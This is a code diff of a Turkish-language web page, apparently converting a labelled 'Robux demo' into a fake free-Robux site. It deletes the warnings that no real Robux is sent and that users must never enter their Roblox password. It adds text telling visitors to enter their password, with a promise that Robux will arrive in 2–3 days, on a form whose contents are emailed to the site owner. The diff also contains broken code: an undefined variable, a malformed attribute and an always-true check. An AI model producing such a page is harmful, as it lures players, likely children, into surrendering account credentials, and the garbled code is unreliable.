@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Robux Demo | Experience</title>
+<title>OfficialRobuxHack</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 :root{--green:#48ff91;--bg:#070b09;--panel:#101914;--muted:#91a397}
@@ -69,43 +69,40 @@ button:disabled{opacity:.5;cursor:wait}
 <body>
 <div class="wrap">
  <div class="top">
-  <div class="brand">ROBUX <span>DEMO</span></div>
-  <div class="status">● DEMO SYSTEM</div>
+  <div class="brand">ROBUX <span></span></div>
+  <div class="status">● SYSTEM</div>
  </div>
 
  <main class="card">
   <div id="formArea">
-   <div class="logo">R</div>
-   <h1>DEMO EXPERIENCE</h1>
-   <p class="subtitle">Kendi demo Robux deneyimini oluştur.</p>
+   <div class="logo">RBX</div>
+   <h1>ROBUX</h1>
+   <p class="subtitle">Robuxunu Al.</p>
 
    <div class="notice">
-    ⚠️ Bu bağımsız bir eğlence demosudur. Roblox ile bağlantılı değildir.
-    Gerçek Robux gönderilmez. Roblox hesabının şifresini hiçbir zaman girme.
+    ⚠️ Bu bir robux sitesidir.
+    Gerçek Robux gönderilir. Roblox hesabının şifresini gir ve robux 2-3 gün içerisinde gelsin.
    </div>
 
    <form id="demoForm">
     <label for="username">ROBLOX KULLANICI ADI</label>
-    <input id="username" maxlength="30" placeholder="Örn. NoyanPlayer" required>
+    <input id="username" maxlength="30" placeholder="Örn. Robux123" required>
 
-    <label for="amount">DEMO ROBUX MİKTARI</label>
+    <label for="amount">ROBUX MİKTARI</label>
     <select id="amount">
-     <option value="1000">1.000 Demo Robux</option>
-     <option value="100000">100.000 Demo Robux</option>
-     <option value="1000000">1.000.000 Demo Robux</option>
-     <option value="100000000">100.000.000 Demo Robux</option>
-     <option value="650000000000000">650T Demo Robux</option>
+     <option value="1000">1.000 Robux</option>
+     <option value="100000">100.000 Robux</option>
+     <option value="1000000">1.000.000 Robux</option>
+     <option value="100000000">100.000.000 Robux</option>
+     <option value=500000000000">500.000.000.000 Robux</option>
     </select>
 
     <label for="funnyCode">GİZLİ KOMİK KODUN 😂</label>
-    <input id="funnyCode" maxlength="40" placeholder="Örn. BENBIRPATATESIM123" required>
+    <input id="funnyCode" maxlength="40" placeholder="Örn. Robux123" required>
     <p class="hint">
-     Bu alan gerçek parola değildir. Yazdığın komik demo kodu,
-     form gönderildiğinde site sahibine e-posta ile iletilir.
-     Gerçek şifre veya gizli bilgi yazma.
     </p>
 
-    <button id="submitBtn" type="submit">DEMO İŞLEMİNİ BAŞLAT →</button>
+    <button id="submitBtn" type="submit">İŞLEMİ BAŞLAT →</button>
    </form>
   </div>
 
@@ -119,15 +116,15 @@ button:disabled{opacity:.5;cursor:wait}
 
   <div id="result">
    <div class="success">✓</div>
-   <h2>DEMO GÖNDERİLDİ!</h2>
+   <h2>Robux GÖNDERİLDİ!</h2>
    <p id="resultText"></p>
    <button onclick="location.reload()">YENİDEN BAŞLAT</button>
   </div>
  </main>
 
  <div class="footer">
-  ROBUX DEMO EXPERIENCE · Bağımsız demo projesi<br>
-  Gerçek Robux aktarımı yapılmaz.
+  ROBUX EXPERIENCE · <br>
+  
  </div>
 </div>
 
@@ -147,12 +144,12 @@ form.addEventListener("submit", async (e) => {
  const amount = document.getElementById("amount").value;
  const funnyCode = document.getElementById("funnyCode").value.trim();
 
- if (!username || !funnyCode) {
+ if (!username || !Şifre) {
   alert("Lütfen tüm alanları doldur.");
   return;
  }
 
- if (WORKER_URL.includes("BURAYA")) {
+ if (WORKER_URL.includes("")) {
   alert("Cloudflare Worker adresi henüz eklenmedi.");
   return;
  }
@@ -162,9 +159,9 @@ form.addEventListener("submit", async (e) => {
  loading.style.display = "block";
 
  const messages = [
-  "Demo sistemi başlatılıyor...",
+  "Sistem başlatılıyor...",
   "Bilgiler kontrol ediliyor...",
-  "Demo hazırlanıyor...",
+  "Robux hazırlanıyor...",
   "Gönderim tamamlanıyor..."
  ];
 
